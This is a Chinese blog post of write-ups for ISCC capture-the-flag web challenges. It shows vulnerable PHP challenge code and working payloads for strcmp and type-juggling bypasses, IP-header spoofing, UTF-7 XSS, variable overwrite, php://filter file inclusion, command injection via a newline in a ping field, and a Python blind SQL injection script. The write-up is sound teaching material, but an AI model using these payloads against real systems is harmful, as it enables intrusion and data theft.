<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  
  <title>ISCCC Web的一些wp | Iuhrey的幻想乡</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="写在前面这是我第一次写wp，因为这次比赛挺简单的，我做的题目挺多的所以才写的这篇wp，像之前的那些偶尔爆零的比赛写出来丢人(这次写出来也挺丢人的)，web400之后总结再写，web300的注入真心不会。。 比较数字大小发现有个输入框，f12查看源码发现要求输入的数字大于某个数，然而输入框限制了输入的长度，把maxlength改为999然后乱按一通就过了。   Web01123456789highl">
<meta name="keywords" content="Web">
<meta property="og:type" content="article">
<meta property="og:title" content="ISCCC Web的一些wp">
<meta property="og:url" content="http://yoursite.com/2018/05/25/ISCC之Web的一些wp/index.html">
<meta property="og:site_name" content="Iuhrey的幻想乡">
<meta property="og:description" content="写在前面这是我第一次写wp，因为这次比赛挺简单的，我做的题目挺多的所以才写的这篇wp，像之前的那些偶尔爆零的比赛写出来丢人(这次写出来也挺丢人的)，web400之后总结再写，web300的注入真心不会。。 比较数字大小发现有个输入框，f12查看源码发现要求输入的数字大于某个数，然而输入框限制了输入的长度，把maxlength改为999然后乱按一通就过了。   Web01123456789highl">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="http://yoursite.com/images/10/7.png">
<meta property="og:image" content="http://yoursite.com/images/10/8.png">
<meta property="og:image" content="http://yoursite.com/images/10/1.png">
<meta property="og:image" content="http://yoursite.com/images/10/2.png">
<meta property="og:image" content="http://yoursite.com/images/10/3.png">
<meta property="og:image" content="http://yoursite.com/images/10/4.png">
<meta property="og:image" content="http://yoursite.com/images/10/5.png">
<meta property="og:image" content="http://yoursite.com/images/10/6.png">
<meta property="og:updated_time" content="2018-09-29T15:12:44.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ISCCC Web的一些wp">
<meta name="twitter:description" content="写在前面这是我第一次写wp，因为这次比赛挺简单的，我做的题目挺多的所以才写的这篇wp，像之前的那些偶尔爆零的比赛写出来丢人(这次写出来也挺丢人的)，web400之后总结再写，web300的注入真心不会。。 比较数字大小发现有个输入框，f12查看源码发现要求输入的数字大于某个数，然而输入框限制了输入的长度，把maxlength改为999然后乱按一通就过了。   Web01123456789highl">
<meta name="twitter:image" content="http://yoursite.com/images/10/7.png">
  
    <link rel="alternate" href="/atom.xml" title="Iuhrey的幻想乡" type="application/atom+xml">
  
  
    <link rel="icon" href="source/images/favicon.ico">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
  

</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <div class="outer">
        <div class="widget-wrap mobile-header">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="/images/avatar.jpg">
    <h2 class="author">Iuhrey</h2>
    <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
    <div class="count-box">
      <a href="/archives"><div><strong>27</strong><br>文章</div></a>
      <a href="/categories"><div><strong>2</strong><br>分类</div></a>
      <a href="/tags"><div><strong>12</strong><br>标签</div></a>
    </div>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>幻想乡的起点</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>幻想乡图</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>分岔路</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>路标</li>
          </a>
        
    </ul>
  </div>
</div>

        <section id="main"><article id="post-ISCC之Web的一些wp" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/05/25/ISCC之Web的一些wp/" class="article-date">
  <time class="post-time" datetime="2018-05-25T02:36:47.000Z" itemprop="datePublished">
    <span class="post-month">5月</span><br>
    <span class="post-day">25</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      ISCCC Web的一些wp
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>这是我第一次写wp，因为这次比赛挺简单的，我做的题目挺多的所以才写的这篇wp，像之前的那些偶尔爆零的比赛写出来丢人(这次写出来也挺丢人的)，web400之后总结再写，web300的注入真心不会。。</p>
<h3 id="比较数字大小"><a href="#比较数字大小" class="headerlink" title="比较数字大小"></a>比较数字大小</h3><p>发现有个输入框，f12查看源码发现要求输入的数字大于某个数，然而输入框限制了输入的长度，把maxlength改为999然后乱按一通就过了。  </p>
<h3 id="Web01"><a href="#Web01" class="headerlink" title="Web01"></a>Web01</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(&apos;2.php&apos;); </span><br><span class="line">$flag=&apos;&#123;***************&#125;&apos;; </span><br><span class="line">if (isset($_GET[&apos;password&apos;])) &#123;   </span><br><span class="line">    if (strcmp($_GET[&apos;password&apos;], $flag) == 0)   </span><br><span class="line">        die(&apos;Flag: &apos;.$flag);   </span><br><span class="line">    else   </span><br><span class="line">        print &apos;Invalid password&apos;;   </span><br><span class="line">&#125;   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这题考察的是对strcmp()函数的理解，strcmp函数在对数组类的变量是会返回0的，在与其他变量比较时直接返回0，成功得到flag    </p>
<h3 id="为什么这么简单啊"><a href="#为什么这么简单啊" class="headerlink" title="为什么这么简单啊"></a>为什么这么简单啊</h3><p>打开网址发现了第一关的提示。<br><img src="/images/10/7.png" alt=""><br>从xxxx进入的意思大致是构造<strong>Referer:<a href="http://edu.xss.tv" target="_blank" rel="noopener">http://edu.xss.tv</a></strong>，ip构造为题目所要的就能进入第二关了。<br>发现页面跳转到了<strong>number2.php?token=260ca9dd8a4577fc00b7bd5810298076</strong>，第二关要求我们输入密码，提示了密码在哪，所以打开F12找密码。<br><img src="/images/10/8.png" alt=""><br>意外发现了password.js，那一串疑似base64的编码加上==号解码试试，果不其然就是密码了，把密码输进去flag到手。</p>
<h3 id="本地的诱惑"><a href="#本地的诱惑" class="headerlink" title="本地的诱惑"></a>本地的诱惑</h3><p>抓包，添加X-Forwarded-For：127.0.0.1，即可得到flag</p>
<h3 id="你能跨过去吗"><a href="#你能跨过去吗" class="headerlink" title="你能跨过去吗"></a>你能跨过去吗</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/NodeMore.jsp?id=672613&amp;page=2&amp;pageCounter=32&amp;undefined&amp;callback=%2b/v%2b%20%2bADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA%2bAC0-&amp;_=1302746925413</span><br></pre></td></tr></table></figure>
<p>题目给了一个这个url，还有xss的提示，在url发现callback参数有问题，url解码发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+/v+ +ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA+AC0-</span><br></pre></td></tr></table></figure></p>
<p>+/v+是utf-7编码格式，后面的base64得到<strong>&lt;�script&gt;alert(“key:/%nsfocusXSStest%/“)&lt;�/script&gt;</strong><br>把key输入文本框就能得到flag了  </p>
<h3 id="一切都是套路"><a href="#一切都是套路" class="headerlink" title="一切都是套路"></a>一切都是套路</h3><p>这道题目一开始还没做出来，后面捋捋思路发现还是挺有趣的，一道关于变量覆盖的题目。<br>首先找找有没有源码泄露，发现有个index.php.txt<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;)</span><br><span class="line">	die(&quot;flag is here&quot;);</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&quot;flag&quot;]) )</span><br><span class="line">	die($_403);</span><br><span class="line"></span><br><span class="line">foreach ($_GET as $k =&gt; $v)&#123;</span><br><span class="line">	$$k = $$v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach ($_POST as $k =&gt; $v)&#123;</span><br><span class="line">	$$k = $v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( $_POST[&quot;flag&quot;] !== $flag )</span><br><span class="line">	die($_403);</span><br><span class="line"></span><br><span class="line">echo &quot;flag: &quot;. $flag . &quot;\n&quot;;</span><br><span class="line">die($_200);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>flag在$flag里面，然后要我们通过post传参使得输入的flag等于$flag里面的内容，但是我们并不知道flag是啥，仔细观察发现有<strong>$$</strong>一个东西，我们可以考虑变量覆盖来做。<br>进一步观察发现$_200这个变量是一定会输出的，而且里面的内容并不重要，而$flag在传参的时候会被覆盖，所以我们可以考虑把$flag的内容给$_200，而$flag我们可以通过post<strong>flag=flag</strong>构造来满足题目所要的<strong>$_POST[“flag”] !== $flag</strong><br>所以最终的构造为<img src="/images/10/1.png" alt="">  </p>
<h3 id="你能绕够吗"><a href="#你能绕够吗" class="headerlink" title="你能绕够吗"></a>你能绕够吗</h3><p>这道题目考察的是文件包含，进题目后随便点点发现了这个<br><img src="/images/10/2.png" alt=""><br>我们可以尝试一下<strong>?f=php://filter/read=convert.base64-encode/resource=index.php</strong><img src="/images/10/3.png" alt="">发现弹出一个error。很有可能把某个关键词给过滤了，试了试发现是php被过滤了，那尝试用大小写来绕过发现没有问题，但是并没有回显<img src="/images/10/4.png" alt="">我们一直index.php是存在的，其他的关键词也没被过滤，<strong>php</strong>这个关键词我们也用大小写绕过了，但是为什么还是读不出结果呢？这只剩下一种可能，由于在之前过滤了php，那很有可能后面又加上了php这个后缀，所以导致我们读不出，抱着希望尝试一下<strong>?f=Php://filter/read=convert.base64-encode/resource=index</strong>，结果出现了回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8dGl0bGU+5a+86Iiq6aG1PC90aXRsZT4KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KPC9oZWFkPgo8Ym9keT4KICAgIDxhIGhyZWY9J2luZGV4LnBocD9mPWFydGljbGVzJmlkPTEnPklEOiAxPC9ocmVmPgogICAgPC9icj4KICAgIDxhIGhyZWY9J2luZGV4LnBocD9mPWFydGljbGVzJmlkPTInPklEOiAyPC9ocmVmPgogICAgPC9icj4KICAgIDxhIGhyZWY9J2luZGV4LnBocD9mPWFydGljbGVzJmlkPTMnPklEOiAzPC9ocmVmPgogICAgPC9icj4KICAgIDxhIGhyZWY9J2luZGV4LnBocD9mPWFydGljbGVzJmlkPTQnPklEOiA0PC9ocmVmPgogICAgPC9icj4KPC9ib2R5Pgo8L2h0bWw+Cgo8P3BocAogICAgI0lTQ0N7TEZJT09PT09PT09PT09PT099CiAgICBpZihpc3NldCgkX0dFVFsnZiddKSl7CiAgICAgICAgaWYoc3RycG9zKCRfR0VUWydmJ10sInBocCIpICE9PSBGYWxzZSl7CiAgICAgICAgICAgIGRpZSgiZXJyb3IuLi4iKTsKICAgICAgICB9CiAgICAgICAgZWxzZXsKICAgICAgICAgICAgaW5jbHVkZSgkX0dFVFsnZiddIC4gJy5waHAnKTsKICAgICAgICB9CiAgICB9CiAgICAKPz4KCg==</span><br></pre></td></tr></table></figure></p>
<p>base64解码后，发现flag  </p>
<h3 id="Web02"><a href="#Web02" class="headerlink" title="Web02"></a>Web02</h3><p>尝试XFF无果，再试着其他几个伪造ip。成功拿到flag<br>记录一下除了XFF可以伪造ip的HTTP头<br>Client-IP<br>x-remote-IP<br>x-originating-IP<br>x-remote-addr  </p>
<h3 id="请ping我的ip-看你能Ping通吗"><a href="#请ping我的ip-看你能Ping通吗" class="headerlink" title="请ping我的ip 看你能Ping通吗"></a>请ping我的ip 看你能Ping通吗</h3><p>这道题目我用扫描器扫了一下，发现有个flag.txt，直接读取flag。后面请教大手子-郁离歌师傅，才知道这里有另一种解法。<br>输入<strong>?ip=127.0.0.1%0a%20ls</strong>可以读取目录，然后再目录下发现flag.txt，<strong>ip=127.0.0.1%0a%20cat%20flag.txt</strong>读取flag.txt  </p>
<h3 id="Please-give-me-username-and-password"><a href="#Please-give-me-username-and-password" class="headerlink" title="Please give me username and password"></a>Please give me username and password</h3><p>这种题目不给提示，那就试试源码泄露，发现index.php.txt存在，读取。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &quot;***********&quot;;</span><br><span class="line">if(isset($_GET[&apos;username&apos;]))&#123;</span><br><span class="line">	if (0 == strcasecmp($flag,$_GET[&apos;username&apos;]))&#123;</span><br><span class="line">	$a = fla;</span><br><span class="line">	echo &quot;very good!Username is right&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">	print &apos;Username is not right&lt;!--index.php.txt--&gt;&apos;;&#125;</span><br><span class="line">&#125;else</span><br><span class="line">print &apos;Please give me username or password!&apos;;</span><br><span class="line">if (isset($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">	if (is_numeric($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">		if (strlen($_GET[&apos;password&apos;]) &lt; 4)&#123;</span><br><span class="line">			if ($_GET[&apos;password&apos;] &gt; 999)&#123;</span><br><span class="line">			$b = g;</span><br><span class="line">			print &apos;&lt;p&gt;very good!Password is right&lt;/p&gt;&apos;;</span><br><span class="line">		&#125;else </span><br><span class="line">			print &apos;&lt;p&gt;Password too little&lt;/p&gt;&apos;;</span><br><span class="line">		&#125;else</span><br><span class="line">		print &apos;&lt;p&gt;Password too long&lt;/p&gt;&apos;;</span><br><span class="line">	&#125;else</span><br><span class="line">	print &apos;&lt;p&gt;Password is not numeric&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">if ($a.$b == &quot;flag&quot;)</span><br><span class="line">	print $flag;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>得到需要满足两个条件。第一，<strong>0 == strcasecmp($flag,$_GET[‘username’]</strong>这里我们可以通过数组来绕过，第二点，password长度小于4，但是他又要大于999，这里我们可以考虑用科学记数法，password=1e9就能大于999。所以最终payload为</p>
<blockquote>
<p>?username[]=1&amp;password=1e9     </p>
</blockquote>
<h3 id="php是世界上最好的语言"><a href="#php是世界上最好的语言" class="headerlink" title="php是世界上最好的语言"></a>php是世界上最好的语言</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;); </span><br><span class="line">if(isset($_POST[&apos;username&apos;])&amp;isset($_POST[&apos;password&apos;]))&#123; </span><br><span class="line">    $username = $_POST[&apos;username&apos;]; </span><br><span class="line">    $password = $_POST[&apos;password&apos;]; </span><br><span class="line">&#125; </span><br><span class="line">else&#123; </span><br><span class="line">    $username=&quot;hello&quot;; </span><br><span class="line">    $password=&quot;hello&quot;; </span><br><span class="line">&#125; </span><br><span class="line">if(md5($password) == 0)&#123; </span><br><span class="line">    echo &quot;xxxxx&quot;; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show_source(__FILE__); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>让我们输入username和password，要求只有一个，就是让我们密码的md5为0，构造0e开头的MD5就够了。<br>接着跳到了一个页面叫我们点击，那就按照他的意思点击吧。<br>接下来发现又是一段源码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NULL &lt;?php </span><br><span class="line">include &apos;flag.php&apos;; </span><br><span class="line">$a = @$_REQUEST[&apos;a&apos;]; </span><br><span class="line">@eval(&quot;var_dump($$a);&quot;); </span><br><span class="line">show_source(__FILE__); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>直接构造a=GLOBALS就行了，这是某春秋上的原题了。</p>
<h3 id="sql注入的艺术"><a href="#sql注入的艺术" class="headerlink" title="sql注入的艺术"></a>sql注入的艺术</h3><p>首先测试了一下’和”是否有用，发现被过滤了，接着试了试<strong>%df%27</strong>发现原来这是宽字节注入，其他的啥也没过滤，按着流程走就行了  </p>
<h3 id="试试看"><a href="#试试看" class="headerlink" title="试试看"></a>试试看</h3><p>观察url发现这又是一道文件包含的题目，瞎操作了一个晚上还是读取不出东西，之后只好求助郁离歌大手子，他丢了两个源码给我让我做代码审计，我自己搭环境测试了好久最终才做出来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&apos;display_errors&apos;,&apos;Off&apos;);</span><br><span class="line"></span><br><span class="line">include(&apos;config.php&apos;);</span><br><span class="line"></span><br><span class="line">$img = $_GET[&apos;img&apos;];</span><br><span class="line">if(isset($img) &amp;&amp; !empty($img))</span><br><span class="line">&#123;</span><br><span class="line">    if(strpos($img,&apos;jpg&apos;) !== false)</span><br><span class="line">    &#123;</span><br><span class="line">        if(strpos($img,&apos;resource=&apos;) !== false &amp;&amp; preg_match(&apos;/resource=.*jpg/i&apos;,$img) === 0)</span><br><span class="line">        &#123;</span><br><span class="line">            die(&apos;File not found.&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        preg_match(&apos;/^php:\/\/filter.*resource=([^|]*)/i&apos;,trim($img),$matches);</span><br><span class="line">        if(isset($matches[1]))</span><br><span class="line">        &#123;</span><br><span class="line">            $img = $matches[1];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        header(&apos;Content-Type: image/jpeg&apos;);</span><br><span class="line">        $data = get_contents($img);</span><br><span class="line">        echo $data;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        die(&apos;File not found.&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;img src=&quot;1.jpg&quot;&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>以及<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">function get_contents($img)</span><br><span class="line">&#123;</span><br><span class="line">	if(strpos($img,&apos;jpg&apos;) !== false)</span><br><span class="line">	&#123;</span><br><span class="line">		return file_get_contents($img);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		header(&apos;Content-Type: text/html&apos;);</span><br><span class="line">		return file_get_contents($img);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>config.php就是读取文件，关键是如何绕过show.php把我们所需要的文件传进去，它要求我们的参数里面必须包含img但是我们一旦有img那读取的一定是图片格式，所以，我们需要把img给弄掉，把我们的show.php的字符传进去。</p>
<blockquote>
<p>preg_match(‘/^php:\/\/filter.<em>resource=([^|]</em>)/i’,trim($img),$matches)   </p>
</blockquote>
<p> 这是把我们resource之后的字符传进去的代码，由于对正则不太熟悉，所以我在本地试了试这行代码的作用，在这个正则表达式中，读取的字符串只是最后一个resource=之后的(感兴趣自己去学习一个正则)，所以我们可以构造多个resource来读取我们所要的字符串，payload为<strong>?img=php://filter/resource=10.jpg/resource=show.php</strong>我们就能读取我们所要的文件了，flag在哪完全是靠直觉，读取flag的操作为<strong>?img=php://filter/resource=10.jpg/resource=../flag.php</strong></p>
<h3 id="Sqli"><a href="#Sqli" class="headerlink" title="Sqli"></a>Sqli</h3><p>讲真，很讨厌这种注入题，也没什么提示，首先还是按照一些万能密码试试，在试到<strong>admin’#</strong>发现成功登入了，这就说明<strong>‘</strong>和<strong>#</strong>没有被过滤，然后试了试<strong>admin’ and 1=1#</strong>和<strong>admin’ and 1=2#</strong>，发现回显不同，布尔型注入没跑了，首先是爆出password，然后登入有个提示flag在kjafuibafuohnuvwnruniguankacbh里面，所以爆破这个字段发现flag，这是最后爆破的脚本。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">databaselength = 13</span><br><span class="line">databasename = &quot;sqli_database&quot;</span><br><span class="line">url = &quot;http://118.190.152.202:8011/&quot;</span><br><span class="line">tablenumber = 2</span><br><span class="line">tablelength = 4</span><br><span class="line">tablename1 = &quot;news&quot;</span><br><span class="line">columnnumber = 6</span><br><span class="line">columnnames = &quot;title note kjafuibafuohnuvwnruniguankacbh id date text&quot;</span><br><span class="line">tablename2 = &quot;user&quot;</span><br><span class="line">columnnumber2 = 45</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    r = requests.post(url,data=&#123;&quot;username&quot;:&quot;admin&apos; and ((select length(kjafuibafuohnuvwnruniguankacbh) from news)=%d)#&quot;%(i),&quot;password&quot;:&quot;123&quot;&#125;)</span><br><span class="line">    if &quot;normal user&quot; in r.content:</span><br><span class="line">        length = i</span><br><span class="line">        break</span><br><span class="line">for i in range(1,length+1):</span><br><span class="line">    for j in range(20,123):</span><br><span class="line">        r1 = requests.post(url,data=&#123;&quot;username&quot;:&quot;admin&apos; and ((select ascii(substr(kjafuibafuohnuvwnruniguankacbh,%d,1)) from news)=%d)#&quot;%(i,j),&quot;password&quot;:&quot;123&quot;&#125;)</span><br><span class="line">        if &quot;normal user&quot; in r1.content:</span><br><span class="line">            flag = flag + chr(j)</span><br><span class="line">            break</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure></p>
<h3 id="Collide"><a href="#Collide" class="headerlink" title="Collide"></a>Collide</h3><p>直接给了源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;secret.php&quot;;</span><br><span class="line">@$username=(string)$_POST[&apos;username&apos;];</span><br><span class="line">function enc($text)&#123;</span><br><span class="line">    global $key;</span><br><span class="line">    return md5($key.$text);</span><br><span class="line">&#125;</span><br><span class="line">if(enc($username) === $_COOKIE[&apos;verify&apos;])&#123;</span><br><span class="line">    if(is_numeric(strpos($username, &quot;admin&quot;)))&#123;</span><br><span class="line">        die($flag);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;you are not admin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    setcookie(&quot;verify&quot;, enc(&quot;guest&quot;), time()+60*60*24*7);</span><br><span class="line">    setcookie(&quot;len&quot;, strlen($key), time()+60*60*24*7);</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure></p>
<p>如果我们的md5(key.username)不等于我们传过去的verify那么网页会自己生成一个verify=md5(key.guest)，以及length为key的长度。那这样我们知道了以下几点：<br>key的长度，key+guest的md5以及username要有admin。<br>已知的条件是不是很熟悉呢？再梳理一遍。<br>salt为51位，salt的MD5已知，拓展字符位admin。<br>没错这就是Hash长度拓展攻击。那么先把username=name这个post过去，然后抓包，使用脚本来拓展，然后传参。<br><img src="/images/10/5.png" alt=""><br><img src="/images/10/6.png" alt=""></p>
<h3 id="Only-admin-can-see-flag"><a href="#Only-admin-can-see-flag" class="headerlink" title="Only admin can see flag"></a>Only admin can see flag</h3><p>见之前的一篇文章。  </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/05/25/ISCC之Web的一些wp/" data-id="cjopao6ga000xlsvjsl9l89tt" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2018/06/01/关于xss的一些学习心得/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">上一篇</strong>
      <div class="article-nav-title">
        
          关于xss的一些学习心得
        
      </div>
    </a>
  
  
    <a href="/2018/05/23/order by和group by在sql注入中的妙用/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">下一篇</strong>
      <div class="article-nav-title">order by以及group by在sql注入中的妙用</div>
    </a>
  
</nav>

  
</article>




  <div id="comments" class="comments">
    <div id="uyan_frame"></div>
  </div>
<script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2158764"></script>
</section>
        
          <aside id="sidebar">
  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <h1 class="blog-title">Iuhrey的幻想乡</h1>
    <h2 class="blog-subtitle">记录日常所学</h2>
    <ul class="blog-link">
     
          <a href="/" title="Home">
